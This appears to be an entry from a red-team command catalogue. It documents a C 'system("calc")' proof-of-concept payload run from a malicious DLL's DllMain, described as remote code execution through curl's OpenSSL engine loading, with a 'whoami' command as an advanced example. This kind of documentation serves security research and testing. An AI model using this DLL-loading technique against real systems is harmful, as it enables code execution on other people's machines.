---
id: cmd-system-calc-001
data: system("calc");
tags:
  - payload-execution
type: command
output: Windows calculator launches.
executor: c
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:36.929Z'
verified: false
validated: true
submitted: true
---
# system-calc

## Command

```c
system("calc");
```

## Description

Executes the Windows calculator as a PoC payload inside the malicious DLL's DllMain on PROCESS_ATTACH, demonstrating RCE via OpenSSL Engine load in curl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `"calc"` | Command to run calc.exe | Yes |

## Examples

### Basic Usage

```c
system("calc");
```

### Advanced Usage

```c
system("cmd /c whoami > c:\output.txt");
```

## Expected Output

calc.exe launches.

## Related

- [[commands/execute-curl-exe]]
